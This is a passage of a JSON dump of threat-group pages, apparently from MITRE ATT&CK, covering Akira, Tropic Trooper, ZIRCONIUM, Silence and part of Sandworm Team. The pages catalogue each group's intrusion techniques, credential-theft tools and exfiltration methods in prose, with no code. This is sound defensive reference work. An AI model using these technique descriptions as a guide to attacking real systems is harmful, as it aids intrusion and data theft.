"content": " Akira Akira is a ransomware variant and ransomware deployment entity active since at least March 2023.[1] Akira uses compromised credentials to access single-factor external access mechanisms such as VPNs for initial access, then various publicly-available tools and techniques for lateral movement.[1][2] Akira operations are associated with \"double extortion\" ransomware activity, where data is exfiltrated from victim environments prior to encryption, with threats to publish files if a ransom is not paid. Technical analysis of Akira ransomware indicates variants capable of targeting Windows or VMWare ESXi hypervisors and multiple overlaps with Conti ransomware.[3][4][5] ID: G1024 \u24d8 Associated Groups: GOLD SAHARA, PUNK SPIDER, Howling Scorpius Contributors: Jiraput Thamsongkrah Version: 2.0 Created: 20 February 2024 Last Modified: 11 March 2025 Version Permalink Live Version Associated Group Descriptions Name Description GOLD SAHARA [2] PUNK SPIDER [6] Howling Scorpius [7] Techniques Used Domain ID Name Use Enterprise T1531 Account Access Removal Akira deletes administrator accounts in victim networks prior to encryption.[2] Enterprise T1560 .001 Archive Collected Data: Archive via Utility Akira uses utilities such as WinRAR to archive data prior to exfiltration.[2] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell Akira has used PowerShell scripts for credential harvesting and privilege escalation.[5] Enterprise T1486 Data Encrypted for Impact Akira encrypts files in victim environments as part of ransomware operations.[3][4] Enterprise T1213 .002 Data from Information Repositories: Sharepoint Akira has accessed and downloaded information stored in SharePoint instances as part of data gathering and exfiltration activity.[2] Enterprise T1482 Domain Trust Discovery Akira uses the built-in Nltest utility or tools such as AdFind to enumerate Active Directory trusts in victim environments.[1] Enterprise T1567 .002 Exfiltration Over Web Service: Exfiltration to Cloud Storage Akira will exfiltrate victim data using applications such as Rclone.[2] Enterprise T1133 External Remote Services Akira uses compromised VPN accounts for initial access to victim networks.[2] Enterprise T1657 Financial Theft Akira engages in double-extortion ransomware, exfiltrating files then encrypting them, in order to prompt victims to pay a ransom.[3][4] Enterprise T1562 .001 Impair Defenses: Disable or Modify Tools Akira has disabled or modified security tools for defense evasion.[5] Enterprise T1036 .005 Masquerading: Match Legitimate Resource Name or Location Akira has used legitimate names and locations for files to evade defenses.[5] Enterprise T1027 .001 Obfuscated Files or Information: Binary Padding Akira has used binary padding to obfuscate payloads.[5] Enterprise T1219 Remote Access Tools Akira uses legitimate utilities such as AnyDesk and PuTTy for maintaining remote access to victim environments.[2][1] Enterprise T1021 .001 Remote Services: Remote Desktop Protocol Akira has used RDP for lateral movement.[5] Enterprise T1018 Remote System Discovery Akira uses software such as Advanced IP Scanner and MASSCAN to identify remote hosts within victim networks.[1] Enterprise T1558 Steal or Forge Kerberos Tickets Akira have used scripts to dump Kerberos authentication credentials.[5] Enterprise T1078 Valid Accounts Akira uses valid account information to remotely access victim networks, such as VPN credentials.[2][1][5] Software ID Name References Techniques S0552 AdFind [1] Account Discovery: Domain Account, Domain Trust Discovery, Permission Groups Discovery: Domain Groups, Remote System Discovery, System Network Configuration Discovery S1129 Akira [8][5] Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Data Encrypted for Impact, File and Directory Discovery, Inhibit System Recovery, Native API, Network Share Discovery, Process Discovery, System Information Discovery, Windows Management Instrumentation S1194 Akira _v2 [4][5][7] Create or Modify System Process, Data Encrypted for Impact, Execution Guardrails, File and Directory Discovery, Log Enumeration, Service Stop S0349 LaZagne [1] Credentials from Password Stores: Windows Credential Manager, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores, Credentials from Password Stores: Keychain, OS Credential Dumping: LSA Secrets, OS Credential Dumping: /etc/passwd and /etc/shadow, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Cached Domain Credentials, OS Credential Dumping: Proc Filesystem, Unsecured Credentials: Credentials In Files S1191 Megazord [4][5][7] Command and Scripting Interpreter: Windows Command Shell, Data Encrypted for Impact, File and Directory Discovery, Log Enumeration, Process Discovery, Service Stop S0002 Mimikatz [1] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket S0029 PsExec [1] Create Account: Domain Account, Create or Modify System Process: Windows Service, Lateral Tool Transfer, Remote Services: SMB/Windows Admin Shares, System Services: Service Execution S1040 Rclone [1] Archive Collected Data: Archive via Utility, Data Transfer Size Limits, Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol, Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol, Exfiltration Over Web Service: Exfiltration to Cloud Storage, File and Directory Discovery References Steven Campbell, Akshay Suthar, & Connor Belfiorre. (2023, July 26). Conti and Akira: Chained Together. Retrieved February 20, 2024. Secureworks. (n.d.). GOLD SAHARA. Retrieved February 20, 2024. Will Thomas. (2023, September 15). Tracking Adversaries: Akira, another descendent of Conti. Retrieved February 21, 2024. CISA et al. (2024, April 18). #StopRansomware: Akira Ransomware. Retrieved December 10, 2024. Nutland, J. and Szeliga, M. (2024, October 21). Akira ransomware continues to evolve. Retrieved December 10, 2024. CrowdStrike. (n.d.). Punk Spider. Retrieved February 20, 2024. Zemah, Y. (2024, December 2). Threat Assessment: Howling Scorpius (Akira Ransomware). Retrieved January 8, 2025. Max Kersten & Alexandre Mundo. (2023, November 29). Akira Ransomware. Retrieved April 4, 2024. "
},
{
"id": 81,
"title": "Tropic Trooper, Pirate Panda, KeyBoy, Group G0081",
"path": "/groups/G0081/index.html",
"content": " Tropic Trooper Tropic Trooper is an unaffiliated threat group that has led targeted campaigns against targets in Taiwan, the Philippines, and Hong Kong. Tropic Trooper focuses on targeting government, healthcare, transportation, and high-tech industries and has been active since 2011.[1][2][3] ID: G0081 \u24d8 Associated Groups: Pirate Panda, KeyBoy Contributors: Edward Millington Version: 1.5 Created: 29 January 2019 Last Modified: 18 April 2024 Version Permalink Live Version Associated Group Descriptions Name Description Pirate Panda [4] KeyBoy [2][1] Techniques Used Domain ID Name Use Enterprise T1071 .001 Application Layer Protocol: Web Protocols Tropic Trooper has used HTTP in communication with the C2.[5][3] .004 Application Layer Protocol: DNS Tropic Trooper's backdoor has communicated to the C2 over the DNS protocol.[3] Enterprise T1119 Automated Collection Tropic Trooper has collected information automatically using the adversary's USBferry attack.[3] Enterprise T1020 Automated Exfiltration Tropic Trooper has used a copy function to automatically exfiltrate sensitive data from air-gapped systems using USB storage.[3] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder Tropic Trooper has created shortcuts in the Startup folder to establish persistence.[5][3] .004 Boot or Logon Autostart Execution: Winlogon Helper DLL Tropic Trooper has created the Registry key HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell and sets the value to establish persistence.[2][3] Enterprise T1059 .003 Command and Scripting Interpreter: Windows Command Shell Tropic Trooper has used Windows command scripts.[3] Enterprise T1543 .003 Create or Modify System Process: Windows Service Tropic Trooper has installed a service pointing to a malicious DLL dropped to disk.[6] Enterprise T1132 .001 Data Encoding: Standard Encoding Tropic Trooper has used base64 encoding to hide command strings delivered from the C2.[3] Enterprise T1140 Deobfuscate/Decode Files or Information Tropic Trooper used shellcode with an XOR algorithm to decrypt a payload. Tropic Trooper also decrypted image files which contained a payload.[2][3] Enterprise T1573 Encrypted Channel Tropic Trooper has encrypted traffic with the C2 to prevent network detection.[3] .002 Asymmetric Cryptography Tropic Trooper has used SSL to connect to C2 servers.[1][3] Enterprise T1052 .001 Exfiltration Over Physical Medium: Exfiltration over USB Tropic Trooper has exfiltrated data using USB storage devices.[3] Enterprise T1203 Exploitation for Client Execution Tropic Trooper has executed commands through Microsoft security vulnerabilities, including CVE-2017-11882, CVE-2018-0802, and CVE-2012-0158.[1][2] Enterprise T1083 File and Directory Discovery Tropic Trooper has monitored files' modified time.[3] Enterprise T1564 .001 Hide Artifacts: Hidden Files and Directories Tropic Trooper has created a hidden directory under C:\\ProgramData\\Apple\\Updates\\ and C:\\Users\\Public\\Documents\\Flash\\.[1][3] Enterprise T1574 .001 Hijack Execution Flow: DLL Tropic Trooper has been known to side-load DLLs using a valid version of a Windows Address Book and Windows Defender executable with one of their tools.[7][5] Enterprise T1070 .004 Indicator Removal: File Deletion Tropic Trooper has deleted dropper files on an infected system using command scripts.[3] Enterprise T1105 Ingress Tool Transfer Tropic Trooper has used a delivered trojan to download additional files.[3] Enterprise T1036 .005 Masquerading: Match Legitimate Resource Name or Location Tropic Trooper has hidden payloads in Flash directories and fake installer files.[3] Enterprise T1106 Native API Tropic Trooper has used multiple Windows APIs including HttpInitialize, HttpCreateHttpHandle, and HttpAddUrl.[3] Enterprise T1046 Network Service Discovery Tropic Trooper used pr and an openly available tool to scan for open ports on target systems.[8][3] Enterprise T1135 Network Share Discovery Tropic Trooper used netview to scan target systems for shared resources.[8] Enterprise T1027 .003 Obfuscated Files or Information: Steganography Tropic Trooper has used JPG files with encrypted payloads to mask their backdoor routines and evade detection.[3] .013 Obfuscated Files or Information: Encrypted/Encoded File Tropic Trooper has encrypted configuration files.[1][3] Enterprise T1566 .001 Phishing: Spearphishing Attachment Tropic Trooper sent spearphishing emails that contained malicious Microsoft Office and fake installer file attachments.[2][8][9][5][3] Enterprise T1057 Process Discovery Tropic Trooper is capable of enumerating the running processes on the system using pslist.[2][3] Enterprise T1055 .001 Process Injection: Dynamic-link Library Injection Tropic Trooper has injected a DLL backdoor into dllhost.exe and svchost.exe.[1][3] Enterprise T1091 Replication Through Removable Media Tropic Trooper has attempted to transfer USBferry from an infected USB device by copying an Autorun function to the target machine.[3] Enterprise T1505 .003 Server Software Component: Web Shell Tropic Trooper has started a web service in the target host and wait for the adversary to connect, acting as a web shell.[3] Enterprise T1518 Software Discovery Tropic Trooper's backdoor could list the infected system's installed software.[3] .001 Security Software Discovery Tropic Trooper can search for anti-virus software running on the system.[2] Enterprise T1082 System Information Discovery Tropic Trooper has detected a target system\u2019s OS version and system volume information.[8][3] Enterprise T1016 System Network Configuration Discovery Tropic Trooper has used scripts to collect the host's network topology.[3] Enterprise T1049 System Network Connections Discovery Tropic Trooper has tested if the localhost network is available and other connection capability on an infected system using command scripts.[3] Enterprise T1033 System Owner/User Discovery Tropic Trooper used letmein to scan for saved usernames on the target system.[8] Enterprise T1221 Template Injection Tropic Trooper delivered malicious documents with the XLSX extension, typically used by OpenXML documents, but the file itself was actually an OLE (XLS) document.[2] Enterprise T1204 .002 User Execution: Malicious File Tropic Trooper has lured victims into executing malware via malicious e-mail attachments.[5] Enterprise T1078 .003 Valid Accounts: Local Accounts Tropic Trooper has used known administrator account credentials to execute the backdoor directly.[3] Software ID Name References Techniques S0190 BITSAdmin [1] BITS Jobs, Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol, Ingress Tool Transfer, Lateral Tool Transfer S0387 KeyBoy [2][9] Boot or Logon Autostart Execution: Winlogon Helper DLL, Command and Scripting Interpreter: Python, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Credentials from Password Stores: Credentials from Web Browsers, Data Obfuscation: Protocol or Service Impersonation, File and Directory Discovery, Hide Artifacts: Hidden Window, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Inter-Process Communication: Dynamic Data Exchange, Obfuscated Files or Information: Encrypted/Encoded File, Screen Capture, System Information Discovery, System Network Configuration Discovery S0012 PoisonIvy [2] Application Window Discovery, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: Active Setup, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data from Local System, Data Staged: Local Data Staging, Encrypted Channel: Symmetric Cryptography, Execution Guardrails: Mutual Exclusion, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Obfuscated Files or Information, Process Injection: Dynamic-link Library Injection, Rootkit S0596 ShadowPad [10] Application Layer Protocol: DNS, Application Layer Protocol: File Transfer Protocols, Application Layer Protocol: Web Protocols, Data Encoding: Non-Standard Encoding, Deobfuscate/Decode Files or Information, Dynamic Resolution: Domain Generation Algorithms, Indicator Removal, Ingress Tool Transfer, Modify Registry, Non-Application Layer Protocol, Obfuscated Files or Information: Fileless Storage, Obfuscated Files or Information, Process Discovery, Process Injection, Process Injection: Dynamic-link Library Injection, Scheduled Transfer, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery, System Time Discovery S0452 USBferry [3] Account Discovery: Local Account, Command and Scripting Interpreter: Windows Command Shell, Data from Local System, File and Directory Discovery, Peripheral Device Discovery, Process Discovery, Remote System Discovery, Replication Through Removable Media, System Binary Proxy Execution: Rundll32, System Network Configuration Discovery, System Network Connections Discovery S0388 YAHOYAH [8] Application Layer Protocol: Web Protocols, Deobfuscate/Decode Files or Information, Ingress Tool Transfer, Obfuscated Files or Information: Encrypted/Encoded File, Software Discovery: Security Software Discovery, System Information Discovery References Horejsi, J., et al. (2018, March 14). Tropic Trooper\u2019s New Strategy. Retrieved November 9, 2018. Ray, V. (2016, November 22). Tropic Trooper Targets Taiwanese Government and Fossil Fuel Provider With Poison Ivy. Retrieved November 9, 2018. Chen, J.. (2020, May 12). Tropic Trooper\u2019s Back: USBferry Attack Targets Air gapped Environments. Retrieved May 20, 2020. Busselen, M. (2020, April 7). On-demand Webcast: CrowdStrike Experts on COVID-19 Cybersecurity Challenges and Recommendations. Retrieved May 20, 2020. Moore, S. et al. (2020, April 30). Anomali Suspects that China-Backed APT Pirate Panda May Be Seeking Access to Vietnam Government Data Center. Retrieved May 19, 2020. Parys, B. (2017, February 11). The KeyBoys are back in town. Retrieved June 13, 2019. Hulcoop, A., et al. (2016, November 17). It\u2019s Parliamentary KeyBoy and the targeting of the Tibetan Community. Retrieved June 13, 2019. Alintanahin, K. (2015). Operation Tropic Trooper: Relying on Tried-and-Tested Flaws to Infiltrate Secret Keepers. Retrieved June 14, 2019. Alexander, G., et al. (2018, August 8). Familiar Feeling: A Malware Campaign Targeting the Tibetan Diaspora Resurfaces. Retrieved June 17, 2019. Insikt Group. (2021, February 28). China-Linked Group RedEcho Targets the Indian Power Sector Amid Heightened Border Tensions. Retrieved March 22, 2021. "
},
{
"id": 82,
"title": "ZIRCONIUM, APT31, Violet Typhoon, Group G0128",
"path": "/groups/G0128/index.html",
"content": " ZIRCONIUM ZIRCONIUM is a threat group operating out of China, active since at least 2017, that has targeted individuals associated with the 2020 US presidential election and prominent leaders in the international affairs community.[1][2] ID: G0128 \u24d8 Associated Groups: APT31, Violet Typhoon Version: 2.2 Created: 24 March 2021 Last Modified: 04 April 2025 Version Permalink Live Version Associated Group Descriptions Name Description APT31 [2] Violet Typhoon [3] Techniques Used Domain ID Name Use Enterprise T1583 .001 Acquire Infrastructure: Domains ZIRCONIUM has purchased domains for use in targeted campaigns.[1] .006 Acquire Infrastructure: Web Services ZIRCONIUM has used GitHub to host malware linked in spearphishing e-mails.[4][5] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder ZIRCONIUM has created a Registry Run key named Dropbox Update Setup to establish persistence for a malicious Python binary.[5] Enterprise T1059 .003 Command and Scripting Interpreter: Windows Command Shell ZIRCONIUM has used a tool to open a Windows Command Shell on a remote host.[5] .006 Command and Scripting Interpreter: Python ZIRCONIUM has used Python-based implants to interact with compromised hosts.[4][5] Enterprise T1584 .008 Compromise Infrastructure: Network Devices ZIRCONIUM has compromised network devices such as small office and home office (SOHO) routers and IoT devices for ORB (operational relay box) Proxy networks.[6][7] Enterprise T1555 .003 Credentials from Password Stores: Credentials from Web Browsers ZIRCONIUM has used a tool to steal credentials from installed web browsers including Microsoft Internet Explorer and Google Chrome.[5] Enterprise T1140 Deobfuscate/Decode Files or Information ZIRCONIUM has used the AES256 algorithm with a SHA1 derived key to decrypt exploit code.[2] Enterprise T1573 .001 Encrypted Channel: Symmetric Cryptography ZIRCONIUM has used AES encrypted communications in C2.[5] Enterprise T1041 Exfiltration Over C2 Channel ZIRCONIUM has exfiltrated files via the Dropbox API C2.[5] Enterprise T1567 .002 Exfiltration Over Web Service: Exfiltration to Cloud Storage ZIRCONIUM has exfiltrated stolen data to Dropbox.[5] Enterprise T1068 Exploitation for Privilege Escalation ZIRCONIUM has exploited CVE-2017-0005 for local privilege escalation.[2] Enterprise T1665 Hide Infrastructure ZIRCONIUM has utilized an ORB (operational relay box) network \u2013 consisting compromised devices such as small office and home office (SOHO) routers, IoT devices, and leased virtual private servers (VPS) \u2013 to obfuscate the origin of C2 traffic.[7] Enterprise T1105 Ingress Tool Transfer ZIRCONIUM has used tools to download malicious files to compromised hosts.[5] Enterprise T1036 Masquerading ZIRCONIUM has spoofed legitimate applications in phishing lures and changed file extensions to conceal installation of malware.[4][5] .004 Masquerade Task or Service ZIRCONIUM has created a run key named Dropbox Update Setup to mask a persistence mechanism for a malicious binary.[5] Enterprise T1027 .002 Obfuscated Files or Information: Software Packing ZIRCONIUM has used multi-stage packers for exploit code.[2] Enterprise T1566 .002 Phishing: Spearphishing Link ZIRCONIUM has used malicious links in e-mails to deliver malware.[1][4][5] Enterprise T1598 Phishing for Information ZIRCONIUM targeted presidential campaign staffers with credential phishing e-mails.[4] .003 Spearphishing Link ZIRCONIUM has used web beacons in e-mails to track hits to attacker-controlled URL's.[1] Enterprise T1090 .003 Proxy: Multi-hop Proxy ZIRCONIUM has utilized an ORB (operational relay box) network \u2013 consisting compromised devices such as small office and home office (SOHO) routers, IoT devices, and leased virtual private servers (VPS) \u2013 to proxy traffic.[7] Enterprise T1012 Query Registry ZIRCONIUM has used a tool to query the Registry for proxy settings.[5] Enterprise T1218 .007 System Binary Proxy Execution: Msiexec ZIRCONIUM has used the msiexec.exe command-line utility to download and execute malicious MSI files.[5] Enterprise T1082 System Information Discovery ZIRCONIUM has used a tool to capture the processor architecture of a compromised host in order to register it with C2.[5] Enterprise T1016 System Network Configuration Discovery ZIRCONIUM has used a tool to enumerate proxy settings in the target environment.[5] Enterprise T1033 System Owner/User Discovery ZIRCONIUM has used a tool to capture the username on a compromised host in order to register it with C2.[5] Enterprise T1124 System Time Discovery ZIRCONIUM has used a tool to capture the time on a compromised host in order to register it with C2.[5] Enterprise T1204 .001 User Execution: Malicious Link ZIRCONIUM has used malicious links in e-mails to lure victims into downloading malware.[4][5] Enterprise T1102 .002 Web Service: Bidirectional Communication ZIRCONIUM has used Dropbox for C2 allowing upload and download of files as well as execution of arbitrary commands.[4][5] References Burt, T. (2020, September 10). New cyberattacks targeting U.S. elections. Retrieved March 24, 2021. Itkin, E. and Cohen, I. (2021, February 22). The Story of Jian \u2013 How APT31 Stole and Used an Unknown Equation Group 0-Day. Retrieved March 24, 2021. Microsoft . (2023, July 12). How Microsoft names threat actors. Retrieved November 17, 2023. Huntley, S. (2020, October 16). How We're Tackling Evolving Online Threats. Retrieved March 24, 2021. Singh, S. and Antil, S. (2020, October 27). APT-31 Leverages COVID-19 Vaccine Theme and Abuses Legitimate Online Services. Retrieved March 24, 2021. Cimpanu, Catalin. (2021, July 20). Chinese hacking group APT31 uses mesh of home routers to disguise attacks. Retrieved July 8, 2024. Raggi, Michael. (2024, May 22). IOC Extinction? China-Nexus Cyber Espionage Actors Use ORB Networks to Raise Cost on Defenders. Retrieved July 8, 2024. "
},
{
"id": 83,
"title": "Silence, Whisper Spider, Group G0091",
"path": "/groups/G0091/index.html",
"content": " Silence Silence is a financially motivated threat actor targeting financial institutions in different countries. The group was first seen in June 2016. Their main targets reside in Russia, Ukraine, Belarus, Azerbaijan, Poland and Kazakhstan. They compromised various banking systems, including the Russian Central Bank's Automated Workstation Client, ATMs, and card processing.[1][2] ID: G0091 \u24d8 Associated Groups: Whisper Spider Contributors: Oleg Skulkin, Group-IB Version: 2.2 Created: 24 May 2019 Last Modified: 17 November 2024 Version Permalink Live Version Associated Group Descriptions Name Description Whisper Spider [3] Techniques Used Domain ID Name Use Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder Silence has used HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run, HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run, and the Startup folder to establish persistence.[4] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell Silence has used PowerShell to download and execute payloads.[1][4] .003 Command and Scripting Interpreter: Windows Command Shell Silence has used Windows command-line to run commands.[1][2][4] .005 Command and Scripting Interpreter: Visual Basic Silence has used VBS scripts.[1] .007 Command and Scripting Interpreter: JavaScript Silence has used JS scripts.[1] Enterprise T1070 .004 Indicator Removal: File Deletion Silence has deleted artifacts, including scheduled tasks, communicates files from the C2 and other logs.[1][4] Enterprise T1105 Ingress Tool Transfer Silence has downloaded additional modules and malware to victim\u2019s machines.[4] Enterprise T1036 .005 Masquerading: Match Legitimate Resource Name or Location Silence has named its backdoor \"WINWORD.exe\".[4] Enterprise T1112 Modify Registry Silence can create, delete, or modify a specified Registry key or value.[4] Enterprise T1106 Native API Silence has leveraged the Windows API, including using CreateProcess() or ShellExecute(), to perform a variety of tasks.[2][4] Enterprise T1571 Non-Standard Port Silence has used port 444 when sending data about the system from the client to the server.[4] Enterprise T1027 .010 Obfuscated Files or Information: Command Obfuscation Silence has used environment variable string substitution for obfuscation.[1] Enterprise T1588 .002 Obtain Capabilities: Tool Silence has obtained and modified versions of publicly-available tools like Empire and PsExec.[5] [2] Enterprise T1003 .001 OS Credential Dumping: LSASS Memory Silence has used the Farse6.1 utility (based on Mimikatz) to extract credentials from lsass.exe.[4] Enterprise T1566 .001 Phishing: Spearphishing Attachment Silence has sent emails with malicious DOCX, CHM, LNK and ZIP attachments. [1][2][4] Enterprise T1055 Process Injection Silence has injected a DLL library containing a Trojan into the fwmain32.exe process.[4] Enterprise T1090 .002 Proxy: External Proxy Silence has used ProxyBot, which allows the attacker to redirect traffic from the current node to the backconnect server via Sock4\\Socks5.[4] Enterprise T1021 .001 Remote Services: Remote Desktop Protocol Silence has used RDP for lateral movement.[4] Enterprise T1018 Remote System Discovery Silence has used Nmap to scan the corporate network, build a network topology, and identify vulnerable hosts.[4] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task Silence has used scheduled tasks to stage its operation.[1] Enterprise T1113 Screen Capture Silence can capture victim screen activity.[2][4] Enterprise T1072 Software Deployment Tools Silence has used RAdmin, a remote software tool used to remotely control workstations and ATMs.[4] Enterprise T1553 .002 Subvert Trust Controls: Code Signing Silence has used a valid certificate to sign their primary loader Silence.Downloader (aka TrueBot).[5] Enterprise T1218 .001 System Binary Proxy Execution: Compiled HTML File Silence has weaponized CHM files in their phishing campaigns.[1][2][5][4] Enterprise T1569 .002 System Services: Service Execution Silence has used Winexe to install a service on the remote system.[2][4] Enterprise T1204 .002 User Execution: Malicious File Silence attempts to get users to launch malicious attachments delivered via spearphishing emails.[1][2][4] Enterprise T1078 Valid Accounts Silence has used compromised credentials to log on to other systems and escalate privileges.[4] Enterprise T1125 Video Capture Silence has been observed making videos of victims to observe bank employees day to day activities.[2][4] Software ID Name References Techniques S0363 Empire [5] Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: SID-History Injection, Access Token Manipulation, Access Token Manipulation: Create Process with Token, Account Discovery: Domain Account, Account Discovery: Local Account, Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, Application Layer Protocol: Web Protocols, Archive Collected Data, Automated Collection, Automated Exfiltration, Boot or Logon Autostart Execution: Security Support Provider, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: Shortcut Modification, Browser Information Discovery, Clipboard Data, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter, Create Account: Local Account, Create Account: Domain Account, Create or Modify System Process: Windows Service, Credentials from Password Stores: Credentials from Web Browsers, Domain or Tenant Policy Modification: Group Policy Modification, Domain Trust Discovery, Email Collection: Local Email Collection, Encrypted Channel: Asymmetric Cryptography, Event Triggered Execution: Accessibility Features, Exfiltration Over C2 Channel, Exfiltration Over Web Service: Exfiltration to Code Repository, Exfiltration Over Web Service: Exfiltration to Cloud Storage, Exploitation for Privilege Escalation, Exploitation of Remote Services, File and Directory Discovery, Group Policy Discovery, Hijack Execution Flow: Path Interception by Unquoted Path, Hijack Execution Flow: Path Interception by Search Order Hijacking, Hijack Execution Flow: Path Interception by PATH Environment Variable, Hijack Execution Flow: Dylib Hijacking, Hijack Execution Flow: DLL, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Input Capture: Credential API Hooking, Native API, Network Service Discovery, Network Share Discovery, Network Sniffing, Obfuscated Files or Information: Command Obfuscation, OS Credential Dumping: LSASS Memory, Process Discovery, Process Injection, Remote Services: Distributed Component Object Model, Remote Services: SSH, Scheduled Task/Job: Scheduled Task, Screen Capture, Software Discovery: Security Software Discovery, Steal or Forge Kerberos Tickets: Kerberoasting, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Owner/User Discovery, System Services: Service Execution, Trusted Developer Utilities Proxy Execution: MSBuild, Unsecured Credentials: Credentials In Files, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Video Capture, Web Service: Bidirectional Communication, Windows Management Instrumentation S0195 SDelete [4] Data Destruction, Indicator Removal: File Deletion S0191 Winexe [2] System Services: Service Execution References Skulkin, O.. (2019, January 20). Silence: Dissecting Malicious CHM Files and Performing Forensic Analysis. Retrieved November 17, 2024. GReAT. (2017, November 1). Silence \u2013 a new Trojan attacking financial organizations. Retrieved May 24, 2019. Crowdstrike. (2020, March 2). 2020 Global Threat Report. Retrieved December 11, 2020. Group-IB. (2018, September). Silence: Moving Into the Darkside. Retrieved May 5, 2020. Group-IB. (2019, August). Silence 2.0: Going Global. Retrieved May 5, 2020. "
},
{
"id": 84,
"title": "Sandworm Team, ELECTRUM, Telebots, IRON VIKING, BlackEnergy (Group), Quedagh, Voodoo Bear, IRIDIUM, Seashell Blizzard, FROZENBARENTS, APT44, Group G0034",
"path": "/groups/G0034/index.html",
"content": " Sandworm Team Sandworm Team is a destructive threat group that has been attributed to Russia's General Staff Main Intelligence Directorate (GRU) Main Center for Special Technologies (GTsST) military unit 74455.[1][2] This group has been active since at least 2009.[3][4][5][6] In October 2020, the US indicted six GRU Unit 74455 officers associated with Sandworm Team for the following cyber operations: the 2015 and 2016 attacks against Ukrainian electrical companies and government organizations, the 2017 worldwide NotPetya attack, targeting of the 2017 French presidential campaign, the 2018 Olympic Destroyer attack against the Winter Olympic Games, the 2018 operation against the Organisation for the Prohibition of Chemical Weapons, and attacks against the country of Georgia in 2018 and 2019.[1][2] Some of these were conducted with the assistance of GRU Unit 26165, which is also referred to as APT28.[7] ID: G0034 \u24d8 Associated Groups: ELECTRUM, Telebots, IRON VIKING, BlackEnergy (Group), Quedagh, Voodoo Bear, IRIDIUM, Seashell Blizzard, FROZENBARENTS, APT44 Contributors: Dragos Threat Intelligence; Hakan KARABACAK Version: 4.2 Created: 31 May 2017 Last Modified: 04 December 2024 Version Permalink Live Version Associated Group Descriptions Name Description ELECTRUM [8][2] Telebots [6][1][2] IRON VIKING [9][1][2] BlackEnergy (Group) [6][2] Quedagh [3] [10][2] Voodoo Bear [4][1][2] IRIDIUM [11] Seashell Blizzard [12] FROZENBARENTS [13] APT44 [14] Campaigns ID Name First Seen Last Seen References Techniques C0028 2015 Ukraine Electric Power Attack December 2015 [15] January 2016 [15] [16] [1] Application Layer Protocol: Web Protocols, Block Command Message, Block Reporting Message, Block Serial COM, Command and Scripting Interpreter: Visual Basic, Commonly Used Port, Connection Proxy, Create Account: Domain Account, Denial of Control, Denial of Service, Device Restart/Shutdown, External Remote Services, External Remote Services, Graphical User Interface, Impair Defenses: Disable or Modify Tools, Indicator Removal: File Deletion, Ingress Tool Transfer, Input Capture: Keylogging, Lateral Tool Transfer, Lateral Tool Transfer, Loss of Availability, Loss of Control, Loss of Productivity and Revenue, Manipulation of Control, Modify Registry, Network Sniffing, Phishing: Spearphishing Attachment, Process Injection, Remote Services, Remote System Discovery, Remote System Discovery, System Binary Proxy Execution: Rundll32, System Firmware, Unauthorized Command Message, User Execution: Malicious File, Valid Accounts, Valid Accounts C0025 2016 Ukraine Electric Power Attack December 2016 [17][18] December 2016 [17][18] [1][19] Account Manipulation, Brute Force, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Command-Line Interface, Compromise Host Software Binary, Create Account, Create Account: Domain Account, Create or Modify System Process: Windows Service, Impair Defenses: Disable Windows Event Logging, Lateral Tool Transfer, Lateral Tool Transfer, Masquerading: Masquerade File Type, Masquerading: Match Legitimate Resource Name or Location, Masquerading: Masquerade Account Name, Masquerading, Obfuscated Files or Information, Obfuscated Files or Information: Software Packing, OS Credential Dumping: LSASS Memory, Remote Services: SMB/Windows Admin Shares, Remote Services, Remote System Discovery, Scripting, Server Software Component: SQL Stored Procedures, Valid Accounts, Windows Management Instrumentation C0034 2022 Ukraine Electric Power Attack June 2022 [20] October 2022 [20] [20][21] Autorun Image, Command and Scripting Interpreter: PowerShell, Command-Line Interface, Create or Modify System Process: Systemd Service, Data Destruction, Domain or Tenant Policy Modification: Group Policy Modification, Lateral Tool Transfer, Masquerading: Masquerade Task or 